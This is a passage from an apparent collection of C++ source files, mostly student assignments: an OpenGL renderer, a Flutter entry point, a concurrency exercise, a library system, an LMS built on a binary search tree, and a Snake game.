1.0};\n\tglLightModelfv(GL_LIGHT_MODEL_AMBIENT, Ia);\n\n\tglEnable(GL_LIGHT0);\n\tglm::vec3 a = normalize(glm::vec3(-1,-1,-1));\n    float l[] = {-a.x, -a.y, -a.z, 0.0};\n    // float l[] = {a.x, a.y, a.z,0};\n    float la[] = {0.0, 0.0, 0.0, 1.0};\n    float ld[] = {10, 10, 10, 1.0};\n    float ls[] = {0.0, 0.0, 0.0, 1.0};\n\n    glLightfv(GL_LIGHT0, GL_POSITION, l); \n    glLightfv(GL_LIGHT0, GL_AMBIENT, la); \n    glLightfv(GL_LIGHT0, GL_DIFFUSE, ld); \n    glLightfv(GL_LIGHT0, GL_SPECULAR, ls);\n}\n\nint main(){\n\n    string input;\n\n    while(true){\n        cout << \"Please enter the output result(exit: 0): a(ImmediateMode), b(VertexArrays)\" << endl; \n        cin >> input;\n        int mode;\n        glfwInit();\n        GLFWwindow* window;\n        \n        if (1 != input.length()){\n            cout << \"You entered incorrectly. Please re-enter!\" << endl; \n            continue;\n        }\n        else{\n            if(input[0] == 'a'){\n                mode = 1;\n                window = glfwCreateWindow(Nx, Ny, \"CGIP_HW5_(a)ImmediateMode 202372001_\uae40\uc18c\uc601\", NULL, NULL);\n\n            }\n            else if(input[0] == 'b'){\n                mode = 2;\n                window = glfwCreateWindow(Nx, Ny, \"CGIP_HW5_(b)VertexArrays 202372001_\uae40\uc18c\uc601\", NULL, NULL);\n            }\n            else if(input[0] == '0'){\n                break;\n            }\n            else{\n                cout << \"You entered incorrectly. Please re-enter!\" << endl; \n                continue;\n            }\n        }\n        \n        if(window == NULL) \n        {\n            cout << \"Failed to create GLFW window\" << endl;\n            glfwTerminate();\n            return -1;\n        }\n\n        glfwMakeContextCurrent(window);\n\n        if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n        {\n            cout << \"Failed to initialize GLAD\" << endl;\n            return -1;\n        }   \n\n        load_mesh(\"bunny.obj\");\n        init_timer();\n        glinit();\n\n        while(!glfwWindowShouldClose(window))\n        {   \n            display(window, mode); \n        }\n        glfwTerminate();\n    }\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calu_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//-------------------------------------------------------------------------------------------\n// File:   practica_4.hpp\n// Author: Carlos Solana Melero (872815) - Diego Mateo Lorente (873338)\n// Date:   11-11-2023\n// Coms:   Programa que, mediante la ayuda de monitores, consigue coger una tarea del b\u00faffer, asignarla a un controlador, procesarla y, finalmente,\n//         muestra los resultados de la ejecuci\u00f3n de las tareas por pantalla\n//-------------------------------------------------------------------------------------------\n\n#include <iostream>\n#include <string>\n#include <fstream>\n#include <MultiBuffer.hpp>\n#include <Matrix.hpp>\n#include <Concurrent_MultiBuffer.hpp>\n#include <cstdlib>\n#include <thread>\n#include <mutex>\n#include <condition_variable>\n#include <unistd.h>\n#include <iomanip>\n\nusing namespace std;\nconst int N_CONTROLLERS = 10;\nconst string nombreFichero = \"tareas.txt\";\nconst unsigned N_TIPOS_TAREA = 3;\n//----------------------------------------------------\nstruct tarea {\n    string tipoTarea;\n    float cargaDeTrabajo;\n};\n//Pre: Necesita el struct MultiBuffer, todos los sem\u00e1foros y la matriz de resultados\n//Post: Lee del fichero y va repartiendo tareas, al final manda la tarea final y muestra por pantalla la matriz\nvoid masterTask(Concurrent_MultiBuffer<tarea,N_CONTROLLERS>& CMB, Matrix<N_TIPOS_TAREA>& M, tarea& task) {\n    ifstream f (nombreFichero);\n    if(f.is_open()){    //Mientras pueda leer manda tareas\n        string cargaTrabajo;\n        while (getline(f,task.tipoTarea,',')){\n            getline(f,cargaTrabajo,'\\n');       //Lee y asigna cada componente\n            task.cargaDeTrabajo = stod(cargaTrabajo);\n            CMB.putTarea(task);\n        }\n        task.tipoTarea = \"TF\";                      //Cuando acabe de leer manda la tarea final\n        CMB.putTF(task);                            //Asignamos la tarea final a todos los controladores\n        CMB.espera();                               //Esperamos a que todos los controladores reciban la tarea final\n        M.muestra();                                //Mostramos la matriz de resultados por pantalla\n        f.close();\n    }\n    else {\n        cerr << \"Error al abrir el fichero \\\"\" + nombreFichero + \"\\\".\\n\";\n    }\n}\n//---------------------------------------------------- \n//Pre:  0 <= id < N_CONTROLLERS\nvoid controllerTask(unsigned int id, Concurrent_MultiBuffer<tarea,N_CONTROLLERS>& CMB, Matrix<N_TIPOS_TAREA>& M, tarea& task, int& n,int& i) {\n    bool seguir = true;\n    while (seguir) {\n        tarea task_local = CMB.getTarea(id);\n        if(task_local.tipoTarea == \"TF\"){          //Comprobamos que la tarea que recibe el controlador es la final para salir del bucle y terminar el proceso\n            seguir = false;\n        }\n        else {\n            srand(id + time(NULL) + i);\n            i++;\n            int numGen = rand() % (100 + 1);        //Generamos un n\u00famero aleatorio entre 0 y 100 para aplicar probabilidad\n            M.escribe(task_local.tipoTarea,numGen, task_local.cargaDeTrabajo,n,id);    //Escribimos los resultados en la matriz de resultados\n        }\n    }\n}\n//----------------------------------------------------\nint main(int argc, char *argv[]) {\n    Concurrent_MultiBuffer<tarea,N_CONTROLLERS> CMB;\n    Matrix<N_TIPOS_TAREA> M;\n    tarea task;\n    int j = 0;\n    thread P[N_CONTROLLERS + 1];        //De momento no inicializamos los threads\n    int n = 0;\n    for(unsigned i = 0; i < N_CONTROLLERS; i++) {\n        P[i] = thread(&controllerTask, i, ref(CMB),ref(M), ref(task),ref(n),ref(j));\n    }\n    P[N_CONTROLLERS] = thread(&masterTask, ref(CMB),ref(M), ref(task));\n    for(unsigned i = 0; i <= N_CONTROLLERS; i++) {\n        P[i].join();\n    }\n    return 0;\n}\n",
    "#include <algorithm>\n#include <cmath>\n#include <iostream>\n#include <limits>\n#include <vector>\n\nstd::string binarify(int);\nint         get_max(std::vector<std::string>);\n\nint\nmain(int argc, char **argv)\n{\n    std::vector<std::string> messages;\n\n    if ( argc == 1 )\n    {\n        std::fprintf(stderr, \"%s\", argv[0]);\n        // std::cout << \"BinDecimal printer\" << std::endl\n        //           << \"Call program with argument\" << std::endl;\n\n        messages = {\n            \"And we've got work in the morning; But it's nearly 5AM; Is this \"\n            \"really what we envisaged?; We won't be 21 again;\",\n            \"So wake me up when it's all over; When I'm wiser and I'm older; \"\n            \"All this time I was finding myself, and I; Didn't know I was \"\n            \"lost\",\n            \"See the stone set in your eyes; See the thorn twist in your \"\n            \"side; I'll wait for you\",\n            \"I had all and then most of you; Some and now none of you; Take \"\n            \"me back to the night we met\",\n            \"Now we're there and we've only just begun; This will be our \"\n            \"year; Took a long time to come\",\n            \"You tell me, \\\"Hit this and let's go; Blow the smoke right \"\n            \"through the window\\\"; 'Cause this is all we know\",\n            \"\u0939\u092e\u0928\u0947 \u0907\u0938 \u092c\u0902\u091c\u0930 \u092d\u0942\u092e\u093f \u092a\u0930 \u091c\u092c \u091c\u094d\u091e\u093e\u0928 \u0915\u093e \u0926\u0940\u092a \u091c\u0932\u093e\u092f\u093e \u0925\u093e\u0964\",\n        };\n    }\n\n    else\n    {\n        // message = argv[1];\n\n        // if ( argc > 2 ) {\n        //   for ( int i = 2; i < argc; i++ ) {\n        //     message.append(\" \");\n        //     message.append(argv[i]);\n        //   }\n        // }\n    }\n\n    for ( std::string message : messages )\n    {\n        std::string              block  = \"\\u2588\";\n        std::string              blocks = \"\\u2588\\u2588\";\n        std::string              dot    = \"\\u2022\";\n        std::vector<int>         dec_vec;\n        std::vector<std::string> bin_vec;\n\n        for ( char c : message )\n        {\n            int num = c;\n\n            dec_vec.push_back(num);\n            bin_vec.push_back(binarify(num));\n        }\n\n        unsigned int max = get_max(bin_vec);\n\n        for ( std::string &bin : bin_vec )\n        {\n            if ( bin.size() < max )\n            {\n                while ( bin.size() != max )\n                {\n                    bin.append(\"x\");\n                }\n            }\n\n            std::reverse(bin.begin(), bin.end());\n        }\n\n        for ( char c : message )\n        {\n            std::cout << c << \" \";\n        }\n        std::cout << std::endl;\n\n        for ( unsigned int j = 0; j < max; j++ )\n        {\n            for ( unsigned int i = 0; i < message.size(); i++ )\n            {\n                // std::cout << message[i] << \": \";\n\n                std::cout << (bin_vec[i][j] == 'x' ? \"  \" : blocks);\n            }\n\n            std::cout << std::endl;\n        }\n    }\n\n    std::string      block  = \"\\u2588\";\n    std::string      blocks = \"\\u2588\\u2588\";\n    std::string      dot    = \"\\u2022\";\n    std::vector<int> dec_vec\n        = { 224, 164, 185, 224, 164, 174, 224, 164, 168, 224, 165, 135,\n            32,  224, 164, 135, 224, 164, 184, 32,  224, 164, 172, 224,\n            164, 130, 224, 164, 156, 224, 164, 176, 32,  224, 164, 173,\n            224, 165, 130, 224, 164, 174, 224, 164, 191, 32,  224, 164,\n            170, 224, 164, 176, 32,  224, 164, 156, 224, 164, 172, 32,\n            224, 164, 156, 224, 165, 141, 224, 164, 158, 224, 164, 190,\n            224, 164, 168, 32,  224, 164, 149, 224, 164, 190, 32,  224,\n            164, 166, 224, 165, 128, 224, 164, 170, 32,  224, 164, 156,\n            224, 164, 178, 224, 164, 190, 224, 164, 175, 224, 164, 190,\n            32,  224, 164, 165, 224, 164, 190, 224, 165, 164 };\n    std::vector<std::string> bin_vec;\n\n    for ( int n : dec_vec )\n    {\n        bin_vec.push_back(binarify(n));\n    }\n\n    unsigned int max = get_max(bin_vec);\n\n    for ( std::string &bin : bin_vec )\n    {\n        if ( bin.size() < max )\n        {\n            while ( bin.size() != max )\n            {\n                bin.append(\"x\");\n            }\n        }\n\n        std::reverse(bin.begin(), bin.end());\n    }\n\n    std::cout << std::endl;\n\n    for ( unsigned int j = 0; j < max; j++ )\n    {\n        for ( unsigned int i = 0; i < dec_vec.size(); i++ )\n        {\n            // std::cout << message[i] << \": \";\n\n            std::cout << (bin_vec[i][j] == 'x' ? \"  \" : blocks);\n        }\n\n        std::cout << std::endl;\n    }\n    return 0;\n}\n\nstd::string\nbinarify(int num)\n{\n    std::string binary = \"\";\n\n    while ( num > 0 )\n    {\n        if ( num % 2 == 0 )\n        {\n            binary.append(\"x\");\n        }\n        else\n        {\n            binary.append(\"o\");\n        }\n\n        num /= 2;\n    }\n\n    return binary;\n}\n\nint\nget_max(std::vector<std::string> bin_vec)\n{\n    int max = -std::numeric_limits<int>::infinity();\n\n    for ( std::string bin : bin_vec )\n    {\n        if ( ( int ) bin.size() > max )\n        {\n            max = bin.size();\n        }\n    }\n\n    return max;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <cmath>\r\n#include <random>\r\n#include <stdexcept>\r\n#include \"src/Ward/Ward.h\"\r\n\r\nusing namespace std;\r\n\r\n// H\u00e0m \u0111\u1ec3 t\u1ea1o ra c\u00e1c s\u1ed1 nguy\u00ean tu\u00e2n theo ph\u00e2n ph\u1ed1i chu\u1ea9n\r\nvector<int> generateNormalDistribution(int total, int n) {\r\n    random_device rd; //  T\u1ea1o s\u1ed1 ng\u1eabu nhi\u00ean\r\n    mt19937 gen(rd()); // Kh\u1edfi t\u1ea1o b\u1ed9 sinh s\u1ed1 ng\u1eabu nhi\u00ean Mersenne Twister\r\n    normal_distribution<> d(total / n, 1); // Ph\u00e2n ph\u1ed1i chu\u1ea9n v\u1edbi trung b\u00ecnh=total/n v\u00e0 \u0111\u1ed9 l\u1ec7ch chu\u1ea9n=1\r\n\r\n    vector<int> result; // Vector \u0111\u1ec3 l\u01b0u k\u1ebft qu\u1ea3\r\n    int sum = 0; // Bi\u1ebfn \u0111\u1ec3 l\u01b0u t\u1ed5ng c\u00e1c ph\u1ea7n t\u1eed\r\n\r\n    // T\u1ea1o n s\u1ed1 tu\u00e2n theo ph\u00e2n ph\u1ed1i chu\u1ea9n\r\n    while (result.size() < n) {\r\n        int number = round(d(gen)); // T\u1ea1o s\u1ed1\r\n        if (number > 0) { // \u0110\u1ea3m b\u1ea3o s\u1ed1 l\u00e0 d\u01b0\u01a1ng\r\n            result.push_back(number); // Th\u00eam s\u1ed1 v\u00e0o vector k\u1ebft qu\u1ea3\r\n            sum += number; // C\u1ed9ng s\u1ed1 v\u00e0o t\u1ed5ng\r\n        }\r\n    }\r\n\r\n    // \u0110i\u1ec1u ch\u1ec9nh c\u00e1c s\u1ed1 \u0111\u1ec3 \u0111\u1ea3m b\u1ea3o t\u1ed5ng ch\u00ednh x\u00e1c\r\n    int diff = total - sum;\r\n    for (int i = 0; i < abs(diff); ++i) {\r\n        result[i % n] += (diff > 0) ? 1 : -1; // \u0110i\u1ec1u ch\u1ec9nh k\u1ebft qu\u1ea3 b\u1eb1ng c\u00e1ch c\u1ed9ng ho\u1eb7c tr\u1eeb 1\r\n    }\r\n\r\n    return result; // Tr\u1ea3 v\u1ec1 vector k\u1ebft qu\u1ea3\r\n}\r\n\r\n// H\u00e0m \u0111\u1ec3 ph\u00e2n ph\u1ed1i gi\u00e1 tr\u1ecb cho c\u00e1c Ward\r\nvector<pair<Ward, int>> distributeWardValues(vector<Ward>& wards, int triple, int single, int numOfAgents) {\r\n    // Ki\u1ec3m tra xem t\u1ed5ng c\u1ee7a triple v\u00e0 single c\u00f3 b\u1eb1ng numOfAgents kh\u00f4ng\r\n    if (triple + single != numOfAgents) {\r\n        throw invalid_argument(\"The sum of triple and single must equal numOfAgents.\");\r\n    }\r\n\r\n    int total = triple * 3 + single; // T\u00ednh t\u1ed5ng gi\u00e1 tr\u1ecb c\u1ea7n ph\u00e2n ph\u1ed1i\r\n    int n = wards.size(); // L\u1ea5y s\u1ed1 l\u01b0\u1ee3ng c\u00e1c Ward\r\n\r\n    // T\u1ea1o ra m\u1ed9t ph\u00e2n ph\u1ed1i chu\u1ea9n c\u1ee7a t\u1ed5ng gi\u00e1 tr\u1ecb\r\n    vector<int> distribution = generateNormalDistribution(total, n);\r\n\r\n    vector<pair<Ward, int>> result; // Vector \u0111\u1ec3 l\u01b0u k\u1ebft qu\u1ea3\r\n    for (int i = 0; i < n; ++i) {\r\n        // T\u1ea1o m\u1ed9t c\u1eb7p c\u1ee7a Ward v\u00e0 gi\u00e1 tr\u1ecb ph\u00e2n ph\u1ed1i, v\u00e0 th\u00eam n\u00f3 v\u00e0o vector k\u1ebft qu\u1ea3\r\n        result.push_back(make_pair(wards[i], distribution[i]));\r\n    }\r\n\r\n    return result; // Tr\u1ea3 v\u1ec1 vector k\u1ebft qu\u1ea3\r\n}",
    "//Maaz ALi\n//22i-1042\n//Assignment4\n\n\n#include <iostream>\n#include \"Books.h\"\n#include \"Books.cpp\"\n#include \"Library.h\"\n#include \"Library.cpp\"\n#include \"Admin.h\"\n#include \"Admin.cpp\"\n#include \"Person.h\"\n#include \"Person.cpp\"\n#include \"Faculty.h\"\n#include \"Faculty.cpp\"\n#include \"Students.h\"\n#include \"Students.cpp\"\n\nusing namespace std;\n\nint main()\n{\n\n    Admin a1;\n    //             int id1, string na1, string ad1, int num1, string date1, string ty\n    a1.addRecord(1, \"40 rules of love\", \"xyz\", 211, \"20-aug-2019\", \"Magzine\");\n    a1.addRecord(2, \"Mien Kamph\", \"Adolf Hittler\", 221, \"20-aug-2019\", \"Story-book\");\n    a1.addRecord(3, \"Differential Equations\", \"Zill\", 21, \"23-aug-2019\", \"Story-Book\");\n    a1.addRecord(4, \"Strating with c++\", \"Tony Gadis\", 2113, \"20-aug-2019\", \"Story-Book\");\n    a1.addRecord(5, \"Digital Electronics\", \"Morris Manno\", 214, \"20-sep-2019\", \"Story-book\");\n    a1.addRecord(6, \"Hillal\", \"Pakistan Army\", 215, \"20-aug-2019\", \"Magzine\");\n    a1.addRecord(7, \"Time\", \"BBC\", 216, \"20-aug-2019\", \"Magzine\");\n    a1.addRecord(8, \"Life at fast\", \"ttt\", 217, \"20-aug-2019\", \"Journal\");\n    a1.addRecord(9, \"13 reasons why\", \"txy\", 218, \"20-aug-2019\", \"Journal\");\n    a1.addRecord(10, \"TLP\", \"Army\", 219, \"20-aug-2019\", \"Journal\");\n    a1.addRecord(11, \"40 rules of love\", \"xyz\", 21122, \"20-aug-2019\", \"Magzine\"); // 11 entry by admin will give error\n    a1.displayLibrary();\n    Faculty f1(22, \"Maaz\", \"034567777777\", \"iwbbe ewhdew qiuhdiuh\"), f2(33, \"Ali\", \"223333333333\", \"dewfwef\");\n    Students s1(302, \"Kaf\", \"747474747474\", \"iwuhediu wiuhdui,wiwi\"), s2(432, \"Ahmad\", \"030303030\", \"jsjsjs bew sj\"), s3(213, \"Huzaifa\", \"032244543\", \"jnkjcskjd sef,Jhelum\");\n    // Before regestring\n    cout << \"\\n---------------------Before regestring_____________________________________\";\n    f1.Regester(true);\n\n    f2.Regester(true);\n\n    s1.Regester(true);\n\n    s2.Regester(true);\n\n    s3.Regester(true);\n\n    a1.regesterMember(f1);\n\n    a1.regesterMember(f2);\n\n    a1.regesterMember(s1);\n\n    a1.regesterMember(s2);\n\n    a1.regesterMember(s3);\n    // After regestring\n    cout << \"\\n---------------------After regestring_____________________________________\";\n    cout<<\"\\nFor Faculty1\";\n    f1.addBook(a1.issueBookfac(8, \"Journal\"));    // will issue book and update the faculty record of issued books.\n    f1.addBook(a1.issueBookfac(2, \"Story-Book\")); // will issue book and update the faculty record of issued books.\n    cout<<\"\\nFor Faculty2\";\n\n    f2.addBook(a1.issueBookfac(9, \"Journal\"));    // will issue book and update the faculty record of issued books.\n    f2.addBook(a1.issueBookfac(3, \"Story-Book\")); // will issue book and update the faculty record of issued books.\n    cout<<\"\\nFor Student1\";\n\n    s1.addBook(a1.issueBookstu(1, \"Magzine\"));    // will issue book and update the faculty record of issued books.\n    s1.addBook(a1.issueBookstu(4, \"Story-Book\")); // will issue book and update the faculty record of issued books.\n    cout<<\"\\nFor Student2\";\n\n    s2.addBook(a1.issueBookstu(5, \"Story-book\")); // will issue book and update the faculty record of issued books.\n    s2.addBook(a1.issueBookstu(6, \"Magzine\"));    // will issue book and update the faculty record of issued books.\n    cout<<\"\\nFor Student3\";\n\n    s3.addBook(a1.issueBookstu(7, \"Magzine\"));  // will issue book and update the faculty record of issued books.\n    s3.addBook(a1.issueBookstu(10, \"Journal\")); // will issue book and update the faculty record of issued books.\n    cout<<\"\\nRetruning for student1\";\n    a1.returnBookstu(1,\"Magzine\");\n    \n    a1.returnBookstu(4,\"Story-Book\");\n    //s1.remBook(a1.ReturnRecord(1,\"Magzine\"));\n\n    //s1.remBook(a1.ReturnRecord(4, \"Story-Book\"));\n    cout<<\"\\nReturning for student2.\";\n    a1.returnBookstu(5,\"Story-Book\");\n    //s2.remBook(a1.ReturnRecord(5, \"Story-Book\"));\n    a1.returnBookstu(6,\"Magzine\");\n    //s2.remBook(a1.ReturnRecord(6, \"Magzine\"));\n    cout<<\"\\n-------------------f1--------------\";\n    f1.print();\n    cout<<\"\\n-------------------f2--------------\";\n    f2.print();\n    cout<<\"\\n-------------------s1--------------\";\n    s1.print();\n    cout<<\"\\n-------------------s2--------------\";\n    s2.print();\n    cout<<\"\\n-------------------s3--------------\";\n    s3.print();\n    cout<<\"\\n-------------------a1--------------\";\n    \n    a1.displayLibrary();\n    return 0;\n}",
    "#include \"config_loader.h\"\n#include \"json.hpp\"\n\nusing namespace std;\nusing namespace nlohmann;\n\nConfig parseConfig(const string &configPath) {\n  ifstream configFile(configPath);\n\n  if (!configFile) {\n    cerr << \"Failed to open config...\" << endl;\n    exit(EXIT_FAILURE);\n  }\n\n  try {\n    json jsonData;\n    configFile >> jsonData;\n\n    Config config;\n    config.modelPath = jsonData.at(\"modelPath\").get<string>();\n    config.inputResolution = jsonData.at(\"inputResolution\").get<int>();\n    config.overlap = jsonData.at(\"overlap\").get<int>();\n    config.upscaleRatio = jsonData.at(\"upscaleRatio\").get<int>();\n    config.deviceID = jsonData.at(\"deviceID\").get<int>();\n\n    cout << \"[Upscale Config]\" << endl;\n    cout << \"Tile Resolution:\"\n         << \"\\t\" << config.inputResolution << endl;\n    cout << \"Tile Overlap:\"\n         << \"\\t\\t\" << config.overlap << endl;\n    cout << \"Ratio:\"\n         << \"\\t\\t\\t\" << config.upscaleRatio << \"\\n\"\n         << endl;\n\n    return config;\n  } catch (...) {\n    cerr << \"Failed to parse config...\" << endl;\n    exit(EXIT_FAILURE);\n  }\n}\n",
    "#include <iostream>\n#include <string>\n#include \"Iterator_Templates.h\"\n\nusing namespace std;\n\nint main() {\n    Single_Linked_List < List_of_students> students_list;\n\n    // \u00c4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00f1\u00f2\u00f3\u00e4\u00e5\u00ed\u00f2\u00ee\u00e2\n    students_list.add(List_of_students(1, \"Korikov\", \"Mihail\", \"Evgenevich\"));\n    students_list.add(List_of_students(24, \"Ivanova\", \"Anna\", \"Petrovna\")); \n    students_list.add(List_of_students(3.14, \"Sidorov\", \"Pavel\", \"Alexandrovich\")); \n    students_list.add(List_of_students(46, \"Smirnova\", \"Maria\", \"Sergeevna\")); \n    students_list.add(List_of_students(\"string_id\", \"Popov\", \"Dmitry\", \"Vladimirovich\")); \n    students_list.add(List_of_students(60, \"Mikhailov\", \"Svetlana\", \"Ivanovna\")); \n    students_list.add(List_of_students(7, \"Fedorov\", \"Andrey\", \"Nikolaevich\")); \n    students_list.add(List_of_students(8, \"Petrova\", \"Olga\", \"Dmitrievna\")); \n\n    // \u00c2\u00fb\u00e2\u00ee\u00e4 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0 \u00f1\u00f2\u00f3\u00e4\u00e5\u00ed\u00f2\u00ee\u00e2\n    cout << \"List of students:\\n\";\n\n    for (Iterator<List_of_students> it = students_list.begin(); it != students_list.end(); ++it) {\n        cout << \"Student ID: \" << get<int>((*it).student_ID) << \", Full name: \" << (*it).student_surname << \" \" << (*it).student_name << \" \" << (*it).student_patronymic << endl;\n    }\n    return 0;\n}\n",
    "#include \"BST.h\"\r\n#include \"Student.h\"\r\n#include \"Teacher.h\"\r\n#include \"Course.h\"\r\n#include <stdexcept>\r\n#include <string>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nclass LMS {\r\nprivate:\r\n    BST<Student> students;\r\n    BST<Teacher> teachers;\r\n    BST<Course> courses;\r\npublic:\r\n    void printStudent(Student& student) {\r\n        std::cout << \"ID: \" << student.getId() << \", Name: \" << student.getName() << std::endl;\r\n    }\r\n    void printTeacher(Teacher& teacher){\r\n        std::cout<< \"ID: \" << teacher.getId() << \", Name: \" << teacher.getUsername() << std::endl;\r\n    }\r\n    void printCourse(Course& course){\r\n        std::cout<< \"ID: \" << course.getId() << \", Name: \" << course.getCourseName() << std::endl;\r\n    }\r\n\r\n    void addStudent(string username, string password, int id) {\r\n        Student student(username, password, id);\r\n        if (students.find(student)) {\r\n            throw runtime_error(\"Student already exists\");\r\n        }\r\n        students.insert(student);\r\n    }\r\n\r\n    void addTeacher(string username, string password, int id) {\r\n        Teacher teacher(username, password, id);\r\n        if (teachers.find(teacher)) {\r\n            throw runtime_error(\"Teacher already exists\");\r\n        }\r\n        teachers.insert(teacher);\r\n    }\r\n\r\n    void addCourse(int id, string name) {\r\n\r\n        Course course(id, name);\r\n        if (courses.find(course)) {\r\n            throw runtime_error(\"Course already exists\");\r\n        }\r\n        courses.insert(course);\r\n    }\r\n\r\n    void enrollStudentInCourse(int StudentID, int courseID) {\r\n        if(students.find(StudentID)&&courses.find(courseID)){\r\n            students.findNodeByID(StudentID)->data.enrollInCourse(courseID);\r\n            courses.findNodeByID(courseID)->data.addStudent(StudentID);\r\n\r\n        }else throw runtime_error(\"Student or Course not found\");\r\n\r\n    }\r\n\r\n    void removeStudentFromCourse(int studentID, int courseID) {\r\n        if(courses.findNodeByID(courseID)->data.hasStudent(studentID))\r\n        courses.findNodeByID(courseID)->data.removeStudent(studentID);\r\n        if(students.findNodeByID(studentID)->data.hasCourse((courseID)))\r\n            students.findNodeByID(studentID)->data.removeCourse(courseID);\r\n\r\n    }\r\n\r\n    void listStudents() const {\r\n        students.inOrderTraversal([](Student& s) {\r\n            cout << \"ID: \" << s.getId() << \", Username: \" << s.getName() << endl;\r\n        });\r\n    }\r\n\r\n    void listTeachers() const {\r\n        teachers.inOrderTraversal([](Teacher& t) {\r\n            cout << \"ID: \" << t.getId() << \", Username: \" << t.getUsername() << endl;\r\n        });\r\n    }\r\n\r\n    void listCourses() const {\r\n        courses.inOrderTraversal([](Course& c) {\r\n            cout << \"ID: \" << c.getId() << \", Name: \" << c.getCourseName() << endl;\r\n        });\r\n    }\r\n\r\n    bool loginStudent(string username, string password, int id) {\r\n        bool loggedIn = false;\r\n        string pass, a;\r\n        if (students.findNodeByID(id)->data.getName()== username && teachers.findNodeByID(id)->data.getPassword() == password) {\r\n            loggedIn = true;\r\n        }\r\n\r\n        return loggedIn;\r\n    }\r\n\r\n    bool loginTeacher(string username, string password, int id) {\r\n        bool loggedIn = false;\r\n        string pass, a;\r\n            if (teachers.findNodeByID(id)->data.getUsername()== username && teachers.findNodeByID(id)->data.getPassword() == password) {\r\n                loggedIn = true;\r\n            }\r\n\r\n        return loggedIn;\r\n    }\r\n\r\n    Student findStudentById(int id) const {\r\n        return students.findNodeByID(id)->data;\r\n    }\r\n\r\n    Teacher findTeacherById(int id) const {\r\n        return teachers.findNodeByID(id)->data;\r\n    }\r\n\r\n    Course findCourseById(int id) const {\r\n        return courses.findNodeByID(id)->data;\r\n    }\r\n\r\n};\r\n\r\n",
    "//============================================================================\n// Name        : Snake\n// Author      : Muhammad Noor\n// Version     :\n// Copyright   : (c) Reserved\n// Description : Basic game of Snake\n//============================================================================\n#ifndef TETRIS_CPP_\n#define TETRIS_CPP_\n#include \"util.h\"\n#include <iostream>\n#include <vector>\n#include <algorithm>\n// #include<cstdlib>\n#include <ctime>\n#include <string>\n// #include<sys/wait.h>\n// #include<stdlib.h>\n// #include<stdio.h>\n#include <unistd.h>\n#include <sstream>\n#include <cmath> // for basic math functions such as cos, sin, sqrt\nusing namespace std;\n\nint width = 650;\nint height = 650;\ndouble x = 320;\ndouble y = 400;\nchar direction = 'W';\nconst int maxbreadth = 90;\nint snake[maxbreadth][2];\nint snakelen = 5;\n\n/* Function sets canvas size (drawing area) in pixels...\n *  that is what dimensions (x and y) your game will have\n *  Note that the bottom-left coordinate has value (0,0) and top-right coordinate has value (width-1,height-1)\n * */\nvoid SetCanvasSize(int width, int height)\n{\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    glOrtho(0, width, 0, height, -1, 1); // set the screen size to given width and height.\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n}\n\nvoid initsnake()\n{\n    for (int i = 0; i < snakelen; i++)\n    {\n        snake[i][0] = width / 2 - i * 10;\n        snake[i][1] = height / 2;\n    }\n}\n\n/*\n * Main Canvas drawing function.\n * */\n\nint foodX = 0;\nint foodY = 0;\nint score = 0;\nint food2X = 0;\nint food2Y = 0;\n\n// Function to generate random position for food\nvoid generateFoodPosition()\n{\n    foodX = rand() % (width / 10) * 10;  // Random X position in steps of 10\n    foodY = rand() % (height / 10) * 10; // Random Y position in steps of 10\n    food2X = rand() % (width / 5) * 10;\n    food2Y = rand() % (height / 5) * 10;\n}\n\nvoid playerscore()\n{\n    if (snake[0][0] == foodX && snake[0][1] == foodY)\n    {\n        score++;\n    }\n}\n\nvoid Display()\n{\n    // set the background color using function glClearColor\n    // to change the background play with the red, green and blue values below.\n    // Note that r, g and b values must be in the range [0,1] where 0 means dim rid and 1 means pure red and so on.\n\n    makegrid();\n    box(25, 25);\n    glClearColor(0.4, 0.0, 0.4, 0.0);\n\n    glClear(GL_COLOR_BUFFER_BIT); // Update the colors\n\n    DrawRoundRect(0, 0, 650, 650, 0, 15);\n\n    // for drawing snake\n\n    if (snake[0][0] < 0 || snake[0][0] >= width || snake[0][1] < 0 || snake[0][1] >= height)\n    {\n        cout << \"Game Over - Collision with Walls!\" << endl;\n        exit(0);\n    }\n\n    /* for (int i = 1; i < snakelen; i++)\n   //  {\n         if (snake[0][0] == snake[i][0] && snake[0][1] == snake[i][1])\n         {\n             cout << \"Game Over - Collision with Itself!\" << endl;\n             exit(0);\n         }\n     }\n  */\n    if (snake[0][0] == foodX && snake[0][1] == foodY)\n    {\n        snakelen++;\n        playerscore();\n        generateFoodPosition();\n        cout << \"Snake ate the food!\" << endl;\n    }\n\n    if (snake[0][0] == food2X && snake[0][1] == food2Y)\n    {\n        snakelen++;\n        playerscore();\n        generateFoodPosition();\n        cout << \"Snake ate the food!\" << endl;\n    }\n\n    // Draw the food\n    DrawCircle(foodX + 5, foodY + 5, 5, colors[RED]);\n\n    for (int i = 0; i < snakelen; i++)\n        DrawSquare(snake[i][0], 